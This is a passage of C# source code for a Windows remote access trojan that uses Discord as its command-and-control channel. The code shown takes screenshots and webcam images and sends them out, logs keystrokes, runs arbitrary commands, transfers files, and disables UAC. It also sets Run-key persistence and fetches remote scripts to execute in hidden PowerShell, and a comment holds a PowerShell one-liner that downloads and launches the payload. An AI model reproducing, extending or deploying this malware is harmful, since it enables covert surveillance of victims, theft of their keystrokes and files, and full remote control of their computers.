                                gfxScreenshot.CopyFromScreen(totalBounds.X, totalBounds.Y, 0, 0, totalBounds.Size, CopyPixelOperation.SourceCopy);

                                // Save the screenshot to a dynamically generated filename
                                string screenshotPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, $"screenshot_{DateTime.Now:yyyyMMdd_HHmmss}.png");
                                screenshot.Save(screenshotPath);

                                // Send the file (NOT AS NORMAL TEXT)
                                await message.Channel.SendFileAsync(screenshotPath)
                                    .ContinueWith(task =>
                                    {
                                        if (task.Exception != null)
                                        {
                                            // Handle exception from SendFileAsync
                                            LogRAT(new LogMessage(LogSeverity.Error, "Screenshot", $"Error sending file: {task.Exception.Message}"));
                                        }
                                        else
                                        {
                                            // Log success
                                            LogRAT(new LogMessage(LogSeverity.Info, "Screenshot", "Screenshot taken and uploaded to Discord."));
                                        }
                                    });
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        // Send discord message
                        await message.Channel.SendMessageAsync($"Error taking screenshot: {ex.Message}");

                        // Log
                        LogRAT(new LogMessage(LogSeverity.Error, "Screenshot", $"Error taking screenshot: {ex.Message}"));
                    }
                }
                else if (trimmedContent == "!webcam")
                {
                    try
                    {
                        // Get available video devices
                        var videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                        int sentCounter = 0;

                        if (videoDevices.Count > 0)
                        {
                            // Initialize webcam capture
                            VideoCaptureDevice webcam = new VideoCaptureDevice(videoDevices[0].MonikerString);

                            // Remove old webcam image
                            string webcamImagePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "webcam_image.png");
                            if (File.Exists(webcamImagePath))
                            {
                                try
                                {
                                    File.Delete(webcamImagePath);
                                    // Log
                                    LogRAT(new LogMessage(LogSeverity.Info, "Webcam", $"Deleted old webcam image."));
                                }
                                catch (Exception ex)
                                {
                                    // Log
                                    LogRAT(new LogMessage(LogSeverity.Error, "Webcam", $"Error deleting old webcam image: {ex.Message}"));
                                }
                            }

                            // Set the flag to indicate that webcam capture is in progress
                            isWebcamCapturing = true;

                            // Start the webcam capture
                            webcam.Start();

                            Bitmap webcamFrame = null;
                            // Take one frame
                            webcam.NewFrame += (s, e) =>
                            {
                                // Get the frame
                                try
                                {
                                    webcamFrame = (Bitmap)e.Frame.Clone();
                                    Log(new LogMessage(LogSeverity.Info, "Webcam", $"Got frame from webcam source..."));
                                }
                                catch (Exception ex)
                                {
                                    // Log
                                    LogRAT(new LogMessage(LogSeverity.Error, "Webcam", $"Error getting frame from webcam: {ex.Message}"));
                                }
                            };

                            // Save the frame to a file
                            try
                            {
                                // Wait for 1 second
                                Thread.Sleep(1000);
                                webcamFrame.Save(webcamImagePath);
                                Log(new LogMessage(LogSeverity.Info, "Webcam", $"Saved webcam image!"));
                                // Wait for 3 second
                                Thread.Sleep(3000);
                            }
                            catch (Exception ex)
                            {
                                // Log
                                LogRAT(new LogMessage(LogSeverity.Error, "Webcam", $"Error saving webcam image: {ex.Message}"));
                            }

                            // Try to close camera
                            try
                            {
                                // Stop the webcam capture
                                webcam.SignalToStop();
                                webcam.WaitForStop();
                                videoDevices.Clear();
                                isWebcamCapturing = false;
                            }
                            catch (Exception ex)
                            {
                                // Log
                                LogRAT(new LogMessage(LogSeverity.Error, "Webcam", $"Error stopping webcam: {ex.Message}"));
                            }

                            // Log if camera still open
                            if (webcam.IsRunning)
                            {
                                Log(new LogMessage(LogSeverity.Info, "Webcam", $"Webcam is still running... Werid, will try to close..."));
                                try
                                {
                                    // Stop the webcam capture
                                    webcam.SignalToStop();
                                    webcam.WaitForStop();
                                    videoDevices.Clear();
                                    isWebcamCapturing = false;
                                    // Log
                                    Log(new LogMessage(LogSeverity.Info, "Webcam", $"Webcam successfully closed!"));
                                }
                                catch (Exception ex)
                                {
                                    // Log
                                    LogRAT(new LogMessage(LogSeverity.Error, "Webcam", $"Error stopping webcam again: {ex.Message}"));
                                }
                            }

                            // Send the file to Discord asynchronously
                            if (sentCounter <= 0)
                            {
                                try
                                {
                                    sentCounter++;
                                    await message.Channel.SendFileAsync(webcamImagePath);
                                    Log(new LogMessage(LogSeverity.Info, "Webcam", $"Sent webcam image to C2!"));
                                }
                                catch (Exception ex)
                                {
                                    // Log
                                    LogRAT(new LogMessage(LogSeverity.Error, "Webcam", $"Error sending webcam image: {ex.Message}"));
                                    return;
                                }
                                sentCounter++;
                            }
                            else
                            {
                                return;
                            }

                            // Delete the file
                            try
                            {
                                File.Delete(webcamImagePath);
                                Log(new LogMessage(LogSeverity.Info, "Webcam", $"Deleted webcam image."));
                            }
                            catch (Exception ex)
                            {
                                // Log
                                LogRAT(new LogMessage(LogSeverity.Error, "Webcam", $"Error deleting webcam image: {ex.Message}"));
                            }

                            // Log
                            LogRAT(new LogMessage(LogSeverity.Info, "Webcam", $"Webcam image taken and uploaded to Discord."));
                        }
                        else
                        {
                            // No video devices available
                            await message.Channel.SendMessageAsync("No video devices available.");
                        }
                    }
                    catch (Exception ex)
                    {
                        // Send Discord message
                        await message.Channel.SendMessageAsync($"Error capturing webcam image: {ex.Message}");

                        // Log
                        LogRAT(new LogMessage(LogSeverity.Error, "Webcam", $"Error capturing webcam image: {ex.Message}"));
                    }
                }
                // KEYLOGGER
                else if (trimmedContent.StartsWith("!keylogger"))
                {
                    // Get the arguments
                    string argument = trimmedContent.Substring(11);

                    // Check if the arguments are valid
                    if (argument == "stop")
                    {
                        // Stop the keylogger
                        StopKeylogger();
                        // Send discord message
                        await message.Channel.SendMessageAsync($"Keylogger stopped.");
                        // Log
                        LogRAT(new LogMessage(LogSeverity.Info, "Keylogger", $"Keylogger stopped."));
                    }
                    else if (argument == "dump")
                    {
                        // Dump the keylogger
                        string log = DumpKeylogger();
                        // Send discord message
                        await message.Channel.SendMessageAsync($"Keylogger dump:\r\n{log}");
                        // Log
                        LogRAT(new LogMessage(LogSeverity.Info, "Keylogger", $"Keylogger dump:\r\n{log}"));
                    }
                    else if (argument == "start")
                    {
                        // Start the keylogger in a new thread
                        Task.Run(() => StartKeylogger());
                        // Send discord message
                        await message.Channel.SendMessageAsync($"Keylogger started.");
                        // Log
                        LogRAT(new LogMessage(LogSeverity.Info, "Keylogger", $"Keylogger started."));
                    }
                    else
                    {
                        // No valid arguments
                        await message.Channel.SendMessageAsync($"Invalid arguments. Please use **!help** for a list of commands.");
                        // Log
                        LogRAT(new LogMessage(LogSeverity.Info, "Keylogger", $"Invalid arguments: {argument}"));
                    }
                }
                // EXECUTION
                else if (trimmedContent.StartsWith("!cmd"))
                {
                    // Get the command
                    string command = trimmedContent.Substring(5);

                    // Send discord message
                    await message.Channel.SendMessageAsync($"Executing command: {command}");

                    // Execute command
                    string ouput = ExecuteCommand(command);

                    // Send discord message
                    await message.Channel.SendMessageAsync($"Output: {ouput}");
                }
                else if (trimmedContent == "!interactive-cmd")
                {
                    // Send discord message
                    await message.Channel.SendMessageAsync($"Starting interactive command... (Type exit to quit)");

                    // Start interactive command
                    await Task.Run(() => InteractiveCommand());

                }
                else if (trimmedContent == "!elevate")
                {
                    // Send discord message
                    await message.Channel.SendMessageAsync($"Elevating bot to admin...");

                    // Elevate to admin
                    await Task.Run(() => ElevateToAdmin());
                }
                // FILE SYSTEM
                else if (trimmedContent.StartsWith("!upload"))
                {
                    // Get argument (path)
                    string argument = trimmedContent.Substring(8);

                    // Get the filename of attached file in "message"
                    string file = message.Attachments.FirstOrDefault()?.Filename;
                    
                    // Send discord message
                    await message.Channel.SendMessageAsync($"Downloading file: {file}");

                    // Log
                    LogRAT(new LogMessage(LogSeverity.Info, "Upload", $"Downloading file: {file}"));

                    try
                    {
                        // Get url to file
                        string url = message.Attachments.FirstOrDefault()?.Url;

                        // Log url
                        LogRAT(new LogMessage(LogSeverity.Info, "Upload", $"URL: {url}"));

                        // Download file
                        string downloadPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, file);
                        if (argument != "" || argument != null || argument != " ")
                            downloadPath = Path.Combine(argument, file);
                        // Log
                        LogRAT(new LogMessage(LogSeverity.Info, "Upload", $"Download path: {downloadPath}"));
                        using (var client = new WebClient())
                        {
                            client.DownloadFile(url, downloadPath);
                        }

                        // Send discord message
                        await message.Channel.SendMessageAsync($"File downloaded to: {downloadPath}");
                    
                        // Log
                        Log(new LogMessage(LogSeverity.Info, "Upload", $"File downloaded to: {downloadPath}"));
                    }
                    catch (Exception ex)
                    {
                        // Send discord message
                        await message.Channel.SendMessageAsync($"Error downloading file: {ex.Message}");
                        // Log
                        Log(new LogMessage(LogSeverity.Error, "Upload", $"Error downloading file: {ex.Message}"));
                    }
                    
                }
                else if (trimmedContent.StartsWith("!download"))
                {
                    // Get the file
                    string file = trimmedContent.Substring(10);

                    // Send discord message
                    await message.Channel.SendMessageAsync($"Downloading file: {file}");

                    // Upload a file from local pc to discord
                    await Task.Run(() => DownloadFile(file));
                }
                // RECOVERY
                
                // OTHER
                else if (trimmedContent == "!log")
                {   
                    try
                    {
                        string log = txtOutput.Text;
                        string fullPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "log.txt");
                        File.WriteAllText(fullPath, log);
                        // Send the file (NOT AS NORMAL TEXT)
                        await message.Channel.SendFileAsync(fullPath);

                        Log(new LogMessage(LogSeverity.Info, "Message", $"Sent log file to C2."));
                        // Remove log
                        File.Delete(fullPath);
                    }
                    catch (Exception ex)
                    {
                        // Send discord message
                        await message.Channel.SendMessageAsync($"Error sending log file: {ex.Message}");
                        // Log
                        Log(new LogMessage(LogSeverity.Error, "Message", $"Error sending log file: {ex.Message}"));
                    }
                }

                // Invalid Command
                else if (trimmedContent.StartsWith("!"))
                {
                    await message.Channel.SendMessageAsync("Invalid command. Please use **!help** for a list of commands.");
                    Log(new LogMessage(LogSeverity.Info, "Message", $"Invalid command: {trimmedContent}"));
                }
            }
        }


        private async Task InteractiveCommand()
        {
            // Get the command
            string command = "";
            string lastCommand = "";

            // Get the command latest command in the channel
            var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild   
            string computerNameRaw = Environment.MachineName;
            string computerName = computerNameRaw.ToLower();
            var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
            
            while (command != "exit")
            {
                var lastMessage = (await channel.GetMessagesAsync(1).FlattenAsync()).FirstOrDefault();
                command = lastMessage.Content;

                // Execute command
                if (command != lastCommand && command != "exit")
                {
                    // Send discord message
                    await channel.SendMessageAsync($"Executing command: {command}");

                    // Execute command
                    await Task.Run(() => ExecuteCommand(command));
                    
                    // Log
                    Log(new LogMessage(LogSeverity.Info, "Interactive Command", $"Executing command: {command}"));

                    // Set last command
                    lastCommand = command;
                }
            }
            Log(new LogMessage(LogSeverity.Info, "Interactive Command", $"Exiting interactive command..."));
        }

        private async Task DownloadFile(string file)
        {
            // Get the file
            string fileToDownload = file;

            // Get the file from the bot
            var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild   
            string computerNameRaw = Environment.MachineName;
            string computerName = computerNameRaw.ToLower();
            var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"ratted-{computerName}");

            // Download the file
            try
            {
                // Download the file
                await channel.SendFileAsync(fileToDownload);
                // Log
                Log(new LogMessage(LogSeverity.Info, "Download", $"Uploaded file: {fileToDownload}"));
            }
            catch (Exception ex)
            {
                // Log
                Log(new LogMessage(LogSeverity.Error, "Download", $"Error uploading file: {ex.Message}"));
            }
        }


        // Keylogger
        private void StartKeylogger()
        {
            try
            {
                // Log that the keylogger has started
                Log(new LogMessage(LogSeverity.Info, "Keylogger", "Keylogger started."));

                // Start here
                HookCallbackDelegate hcDelegate = HookCallback;

                string mainModuleName = Process.GetCurrentProcess().MainModule.ModuleName;
                IntPtr hook = SetWindowsHookEx(WH_KEYBOARD_LL, hcDelegate, GetModuleHandle(mainModuleName), 0);

                //Application.Run();
            }
            catch (Exception ex)
            {
                // Log
                Log(new LogMessage(LogSeverity.Error, "Keylogger", $"Error starting keylogger: {ex.Message}"));
            }

        }

        private void StopKeylogger()
        {
            
        }

        private string DumpKeylogger()
        {
            string originalLog = KeyloggerLog;

            // Format the log
            string formattedLog = FormatKeylog(originalLog);

            // Clear the keyloggerLog after dumping
            KeyloggerLog = "";

            return formattedLog;
        }

        public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            // Find form
            Form1 form = Application.OpenForms.OfType<Form1>().FirstOrDefault();
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                // Log
                form.Log(new LogMessage(LogSeverity.Info, "Keylogger", $"[{(Keys)vkCode}]"));
                // Add to keylogger log
                form.KeyloggerLog += $"[{(Keys)vkCode}]";
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }
        public delegate IntPtr HookCallbackDelegate(int nCode, IntPtr wParam, IntPtr lParam);
        
        private string FormatKeylog(string original)
        {
            // Log
            Log(new LogMessage(LogSeverity.Info, "Keylogger", $"Formatting keylogger...\r\nInput: {original}"));
            // Format the log
            string formattedLog = original.Replace("[", "").Replace("]", "");
            formattedLog = formattedLog.Replace("Space", " ");
            formattedLog = formattedLog.Replace("Return", "\r\n");
            formattedLog = formattedLog.Replace("OemPeriod", ".");
            formattedLog = formattedLog.Replace("Oemcomma", ",");
            formattedLog = formattedLog.Replace("OemQuestion", "?");
            formattedLog = formattedLog.Replace("OemSemicolon", ";");
            formattedLog = formattedLog.Replace("OemQuotes", "\"");
            formattedLog = formattedLog.Replace("OemOpenBrackets", "{");
            formattedLog = formattedLog.Replace("OemCloseBrackets", "}");
            formattedLog = formattedLog.Replace("Oemplus", "+");
            formattedLog = formattedLog.Replace("OemMinus", "-");
            formattedLog = formattedLog.Replace("OemPipe", "|");
            formattedLog = formattedLog.Replace("Oemtilde", "ö");
            formattedLog = formattedLog.Replace("OemBackslash", "\\");
            formattedLog = formattedLog.Replace("Oem8", "*");
            formattedLog = formattedLog.Replace("Oem7", "ä");
            formattedLog = formattedLog.Replace("Oem6", "å");
            formattedLog = formattedLog.Replace("Oem5", "%");
            formattedLog = formattedLog.Replace("Oem3", "#");
            formattedLog = formattedLog.Replace("Oem1", ":");
            formattedLog = formattedLog.Replace("Oem102", "<");
            formattedLog = formattedLog.Replace("Oem6", ">");
            formattedLog = formattedLog.Replace("Oem7", "'");
            formattedLog = formattedLog.Replace("Oem4", "$");
            formattedLog = formattedLog.Replace("Oem2", "/");
            formattedLog = formattedLog.Replace("D1", "1");
            formattedLog = formattedLog.Replace("D2", "2");
            formattedLog = formattedLog.Replace("D3", "3");
            formattedLog = formattedLog.Replace("D4", "4");
            formattedLog = formattedLog.Replace("D5", "5");
            formattedLog = formattedLog.Replace("D6", "6");
            formattedLog = formattedLog.Replace("D7", "7");
            formattedLog = formattedLog.Replace("D8", "8");
            formattedLog = formattedLog.Replace("D9", "9");
            formattedLog = formattedLog.Replace("D0", "0");

            // Log before removing shift and back
            Log(new LogMessage(LogSeverity.Info, "Keylogger", $"Before removing shift and back...\r\nOutput: {formattedLog}"));

            // If back then remove one character behind back
            if (formattedLog.Contains("Back"))
            {
                int index = formattedLog.IndexOf("Back");
                formattedLog = formattedLog.Remove(index - 1, 1);
            }
            // Check what is after "[RShiftKey]"
            int startIndexR = 0;
            while ((startIndexR = formattedLog.IndexOf("RShiftKey", startIndexR)) != -1)
            {
                int index = startIndexR;
                string nextChar = formattedLog.Substring(index + 9, 1);

                // Log
                Log(new LogMessage(LogSeverity.Info, "Keylogger", $"Next char: {nextChar} (RShiftKey)"));

                // Handle replacements based on nextChar
                switch (nextChar)
                {
                    case "1":
                        formattedLog = formattedLog.Replace("RShiftKey1", "!");
                        break;
                    case "2":
                        formattedLog = formattedLog.Replace("RShiftKey2", "\"");
                        break;
                    case "3":
                        formattedLog = formattedLog.Replace("RShiftKey3", "#");
                        break;
                    case "4":
                        formattedLog = formattedLog.Replace("RShiftKey4", "$");
                        break;
                    case "5":
                        formattedLog = formattedLog.Replace("RShiftKey5", "%");
                        break;
                    case "6":
                        formattedLog = formattedLog.Replace("RShiftKey6", "&");
                        break;
                    case "7":
                        formattedLog = formattedLog.Replace("RShiftKey7", "/");
                        break;
                    case "8":
                        formattedLog = formattedLog.Replace("RShiftKey8", "(");
                        break;
                    case "9":
                        formattedLog = formattedLog.Replace("RShiftKey9", ")");
                        break;
                    case "0":
                        formattedLog = formattedLog.Replace("RShiftKey0", "=");
                        break;
                    case "+":
                        formattedLog = formattedLog.Replace("RShiftKey+", "?");
                        break;
                    default:
                        // Handle the default case if needed
                        break;
                }

                // Move to the next character after the found occurrence
                startIndexR += 1;
            }

            // Check what is after "[LShiftKey]"
            int startIndexL = 0;
            while ((startIndexL = formattedLog.IndexOf("RShiftKey", startIndexL)) != -1)
            {
                int index = startIndexL;
                string nextChar = formattedLog.Substring(index + 9, 1);

                // Log
                Log(new LogMessage(LogSeverity.Info, "Keylogger", $"Next char: {nextChar} (RShiftKey)"));

                // Handle replacements based on nextChar
                switch (nextChar)
                {
                    case "1":
                        formattedLog = formattedLog.Replace("LShiftKey1", "!");
                        break;
                    case "2":
                        formattedLog = formattedLog.Replace("LShiftKey2", "\"");
                        break;
                    case "3":
                        formattedLog = formattedLog.Replace("LShiftKey3", "#");
                        break;
                    case "4":
                        formattedLog = formattedLog.Replace("LShiftKey4", "$");
                        break;
                    case "5":
                        formattedLog = formattedLog.Replace("LShiftKey5", "%");
                        break;
                    case "6":
                        formattedLog = formattedLog.Replace("LShiftKey6", "&");
                        break;
                    case "7":
                        formattedLog = formattedLog.Replace("LShiftKey7", "/");
                        break;
                    case "8":
                        formattedLog = formattedLog.Replace("LShiftKey8", "(");
                        break;
                    case "9":
                        formattedLog = formattedLog.Replace("LShiftKey9", ")");
                        break;
                    case "0":
                        formattedLog = formattedLog.Replace("LShiftKey0", "=");
                        break;
                    case "+":
                        formattedLog = formattedLog.Replace("LShiftKey+", "?");
                        break;
                    default:
                        // Handle the default case if needed
                        break;
                }

                // Move to the next character after the found occurrence
                startIndexL += 1;
            }


            // Remove left and right shift
            formattedLog = formattedLog.Replace("LShiftKey", "");
            formattedLog = formattedLog.Replace("RShiftKey", "");
            // Remove left and right control
            formattedLog = formattedLog.Replace("LControlKey", "");
            formattedLog = formattedLog.Replace("RControlKey", "");
            // Remove left and right alt
            formattedLog = formattedLog.Replace("LMenu", "");
            formattedLog = formattedLog.Replace("RMenu", "");
            // Remove left and right windows
            formattedLog = formattedLog.Replace("LWin", "");
            formattedLog = formattedLog.Replace("RWin", "");
            // Remove back
            formattedLog = formattedLog.Replace("Back", "");

            // Log
            Log(new LogMessage(LogSeverity.Info, "Keylogger", $"Formatted keylogger...\r\nOutput: {formattedLog}"));
            return formattedLog;
        }


        // Spliting
        static List<Tuple<int, int>> SplitRange(int start, int end, int splits)
        {
            if (splits <= 0)
            {
                throw new ArgumentException("Number of splits must be greater than 0.");
            }

            List<Tuple<int, int>> splitRanges = new List<Tuple<int, int>>();
            int rangeSize = (end - start + 1) / splits;
            int remainder = (end - start + 1) % splits;

            int currentStart = start;
            int currentEnd = start + rangeSize - 1 + Math.Min(remainder, 1);

            for (int i = 0; i < splits; i++)
            {
                splitRanges.Add(new Tuple<int, int>(currentStart, currentEnd));

                currentStart = currentEnd + 1;
                currentEnd = currentStart + rangeSize - 1 + (i + 1 < remainder ? 1 : 0);
            }

            return splitRanges;
        }


        // Updater
        public Task UpdateBot(string url)
        {
            // Update bot from url (powershell). Script could look like this:
            /// -------------------------------------- ///
            ///
            /// cd C:\Windows\security; if (!(Test-Path .\database)) { New-Item -ItemType Directory -Path .\database }; cd .\database; foreach ($i in ('AForge.dll', 'AForge.Video.DirectShow.dll', 'AForge.Video.dll', 'Discord.Net.Commands.dll', 'Discord.Net.Core.dll', 'Discord.Net.Interactions.dll', 'Discord.Net.Rest.dll', 'Discord.Net.Webhook.dll', 'Discord.Net.WebSocket.dll', 'Microsoft.Extensions.DependencyInjection.Abstractions.dll', 'MultiCracker.deps.json', 'MultiCracker.dll', 'MultiCracker.exe', 'MultiCracker.pdb', 'MultiCracker.runtimeconfig.json', 'Newtonsoft.Json.dll', 'System.Interactive.Async.dll', 'System.Linq.Async.dll', 'System.Reactive.dll')) { curl -Uri "https://raw.githubusercontent.com/USERNAME/REPONAME/main/PAYLOADS/MULTICRACKER/2.2.0/$i" -OutFile $i }; C:\windows\security\database\multicracker.exe
            /// 
            /// -------------------------------------- ///
            
            // Get content from url
            string content = GetContent(url);

            // Execute the content with powershell
            try
            {
                string command = $"-NoProfile -ExecutionPolicy Bypass -Command \"{content}\"";
                // Execute command with powershell
                ProcessStartInfo processInfo = new ProcessStartInfo("powershell", $"{command}");
                processInfo.CreateNoWindow = true;
                processInfo.UseShellExecute = false;
                processInfo.WindowStyle = ProcessWindowStyle.Hidden;
                Process process = new Process();    
                process.StartInfo = processInfo;
                process.Start();
                process.WaitForExit();

                // Log
                Log(new LogMessage(LogSeverity.Info, "Update", $"Bot updated."));
            }
            catch (Exception ex)
            {
                // Log
                Log(new LogMessage(LogSeverity.Error, "Update", $"Error updating bot: {ex.Message}"));
            }
            return Task.CompletedTask;
        }
        private string GetContent(string url)
        {
            string content = "";
            try
            {
                using (WebClient client = new WebClient())
                {
                    content = client.DownloadString(url);
                    // Log
                    Log(new LogMessage(LogSeverity.Info, "Update", $"Got content from url: {url}"));
                    // Log content
                    Log(new LogMessage(LogSeverity.Info, "Update", $"Content got: {content}"));
                }
            }
            catch (Exception ex)
            {
                // Log
                Log(new LogMessage(LogSeverity.Error, "Update", $"Error getting content: {ex.Message}"));
            }
            return content;
        }


        // Admin
        static bool IsAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);

            // Check if the current user is in the Administrators group
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
        void ElevateToAdmin()
        {
            try
            {
                // Get the path of the current executable
                string exePath = Application.ExecutablePath;

                // Execute command with powershell
                // powershell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command C:\Github-Stuff\C#\Multi-Cracker\MultiCracker\bin\Debug\net6.0-windows\MultiCracker.exe'}"
                string command = $"-NoProfile -ExecutionPolicy Bypass -Command \"& {{Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command {exePath}'}}\"";
                ProcessStartInfo processInfo = new ProcessStartInfo("powershell", $"{command}");
                Log(new LogMessage(LogSeverity.Info, "Elevate", $"Command to elevate: " + $"powershell {command}"));
                processInfo.CreateNoWindow = true;
                processInfo.UseShellExecute = false;
                processInfo.WindowStyle = ProcessWindowStyle.Hidden;
                Process process = new Process();
                process.StartInfo = processInfo;
                process.Start();
                process.WaitForExit();
            }
            catch (Exception ex)
            {
                // Log
                Log(new LogMessage(LogSeverity.Error, "Elevate", $"Error elevating to admin: {ex.Message}"));
            }
        }
        bool DisableUAC()
        {
            // Try to change the registry key
            try
            {
                // Set the registry key
                RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true);
                key.SetValue("EnableLUA", 0);
                // Log
                Log(new LogMessage(LogSeverity.Info, "UAC", $"Disabled UAC."));
                return true;
            }
            catch (Exception ex)
            {
                // Log
                Log(new LogMessage(LogSeverity.Error, "UAC", $"Error disabling UAC: {ex.Message}"));
                return false;
            }
        }


        // Persistence
        async void InstallPersistence()
        {
            // Using registry to install persistence
            // Find the name of computer
            string computerNameRaw = Environment.MachineName;
            string computerName = computerNameRaw.ToLower();

            // Find the channel
            var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
            var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}"); 

            if ( channel == null )
            {
                // Log
                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error installing persistence. Channel not found."));
                return;
            }


            // Variables
            bool fullPersistenceInstalled = false;
            bool exePersistenceInstalled = false;
            bool regeditPersistenceInstalled = false;
            string exePath = Application.ExecutablePath;
            string exeName = fileName;
            string fullExePath = Path.Combine(dropPath, exeName);


            // Check if regedit persistence is already installed
            RegistryKey keyCheck = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            string[] subKeys = keyCheck.GetValueNames();
            foreach (string subKey in subKeys)
            {
                if (subKey == registryName)
                {
                    regeditPersistenceInstalled = true;
                }
            }

            // Check if the executable is in droppoint
            if (File.Exists(fullExePath))
            {
                exePersistenceInstalled = true;
            }

            // Check if both are installed
            if (regeditPersistenceInstalled && exePersistenceInstalled)
            {
                fullPersistenceInstalled = true;
            }

            if (fullPersistenceInstalled)
            {
                // Send discord message
                await channel.SendMessageAsync($"Persistence is already installed.");
                // Log
                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Persistence is already installed."));
                return;
            }
            else
            {
                // Log whats missing for full persistence
                if (!regeditPersistenceInstalled)
                {
                    await channel.SendMessageAsync($"Regedit persistence is not installed. Fixing...");
                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Regedit persistence is not installed. Fixing..."));
                }
                if (!exePersistenceInstalled)
                {
                    await channel.SendMessageAsync($"Exe persistence is not installed. Fixing...");
                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Exe persistence is not installed. Fixing..."));
                }

                // Check if admin
                bool isAdmin = IsAdministrator();
                if (!isAdmin)
                {
                    // Send discord message
                    await channel.SendMessageAsync($"Error installing persistence. Not admin. (Use **!elevate** to ask for elevation)");
                    // Log
                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error installing persistence. Not admin."));
                    return;
                }
                else
                {
                    // Log
                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Installing persistence..."));

                    // Set important variables
                    exePath = Application.ExecutablePath;
                    exeName = Path.GetFileName(exePath);

                    // Check if dropPoint directory exists
                    if (!Directory.Exists(dropPath))
                    {
                        // Create directory
                        Directory.CreateDirectory(dropPath);
                        // Log
                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Created directory: {dropPath}"));
                    }
                    else
                    {
                        // Log
                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Directory already exists: {dropPath}"));
                    }

                    try
                    {
                        // Move everything in current directory to drop point
                        string[] files = Directory.GetFiles(AppDomain.CurrentDomain.BaseDirectory);
                        foreach (string file in files)
                        {
                            string fileName = Path.GetFileName(file);
                            string fullFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, fileName);
                            string newFilePath = Path.Combine(dropPath, fileName);
                            File.Move(fullFilePath, newFilePath);
                            // Log
                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Moved {fileName} to {dropPath}"));
                        }
                    }
                    catch (Exception ex)
                    {
                        // Send discord message
                        await channel.SendMessageAsync($"Error moving files to drop point: {ex.Message}");
                        // Log
                        Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error moving files to drop point: {ex.Message}"));
                    }

                    // Create registry key
                    try
                    {
                        RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        string newExePath = Path.Combine(dropPath, exeName);
                        key.SetValue(registryName, newExePath);
                        // Send discord message
                        await channel.SendMessageAsync($"Installed persistence.");
                        // Log
                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Installed persistence."));
                    }
                    catch (Exception ex)
                    {
                        // Send discord message
                        await channel.SendMessageAsync($"Error adding registry key: {ex.Message}");
                        // Log
                        Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error adding registry key: {ex.Message}"));
                    }
                }
            }
        }
        async void UninstallPersistence()
        {
            // Using registry to uninstall persistence

            // Find the name of computer
            string computerNameRaw = Environment.MachineName;
            string computerName = computerNameRaw.ToLower();

            // Find the channel
            var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
            var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");

            if (channel == null)
            {
                // Log
                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error installing persistence. Channel not found."));
                return;
            }

            // Variables
            bool anyPersistenceInstalled = false;
            bool exePersistenceInstalled = false;
            bool regeditPersistenceInstalled = false;
            string exePath = Application.ExecutablePath;
            string exeName = fileName;
            string fullExePath = Path.Combine(dropPath, exeName);


            // Check if regedit persistence is already installed
            RegistryKey keyCheck = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            string[] subKeys = keyCheck.GetValueNames();
            foreach (string subKey in subKeys)
            {
                if (subKey == registryName)
                {
                    regeditPersistenceInstalled = true;
                }
            }

            // Check if the executable is in droppoint
            if (File.Exists(fullExePath))
            {
                exePersistenceInstalled = true;
            }

            // Check if both are installed
            if (regeditPersistenceInstalled || exePersistenceInstalled)
            {
                anyPersistenceInstalled = true;
            }

            if (anyPersistenceInstalled)
            {
                // Log whats missing for full persistence
                if (regeditPersistenceInstalled)
                {
                    await channel.SendMessageAsync($"Regedit persistence is installed. Removing...");
                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Regedit persistence is installed. Removing..."));
                }
                if (exePersistenceInstalled)
                {
                    await channel.SendMessageAsync($"Exe persistence is installed. Removing...");
                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Exe persistence is installed. Removing..."));
                }

                // Check if admin
                bool isAdmin = IsAdministrator();

                // if not admin
                if (!isAdmin)
                {
                    // Send discord message
                    await channel.SendMessageAsync($"Error uninstalling persistence. Not admin. (Use **!elevate** to ask for elevation)");
                    // Log
                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error uninstalling persistence. Not admin."));
                    return;
                }
                else
                {
                    // Log
